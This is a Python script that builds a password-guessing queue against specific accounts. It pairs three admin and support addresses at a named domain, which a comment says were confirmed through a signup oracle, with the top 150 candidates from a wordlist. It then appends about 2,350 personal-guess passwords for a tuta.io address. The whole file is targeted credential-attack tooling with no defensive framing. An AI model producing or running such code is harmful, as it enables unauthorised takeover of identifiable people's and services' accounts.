#!/usr/bin/env python3
"""Build multi-email queue: priority admin emails x top passwords, then tuta resume."""
import os

base = [l.rstrip("\n") for l in open("/tmp/ops_queue.txt", encoding="utf-8", errors="ignore") if l.strip()]

# Priority admin emails (all confirmed registered via signup oracle):
# admin@onlyfakeai.ru, support@onlyfakeai.ru, onlyfake@onlyfakeai.ru, onlyfake@tuta.io
admin_emails = ["admin@onlyfakeai.ru", "support@onlyfakeai.ru", "onlyfake@onlyfakeai.ru"]
top = base[:150]           # brand + nazarenko/personal high-probability head
rows = []
for e in admin_emails:
    for pw in top:
        rows.append(f"{e}:{pw}")

# remaining: onlyfake@tuta.io personal block + brand
personal_tail = base[150:2500]
for pw in personal_tail:
    rows.append(f"onlyfake@tuta.io:{pw}")

# de-dupe while preserving order
seen = set(); out = []
for r in rows:
    if r not in seen:
        seen.add(r); out.append(r)
open("/tmp/ops_queue2.txt", "w", encoding="utf-8").write("\n".join(out) + "\n")
print("multi queue rows:", len(out), "| admin-phase:", len(admin_emails)*len(top), "| tuta tail:", len(personal_tail))
print("first 3:", out[:3])
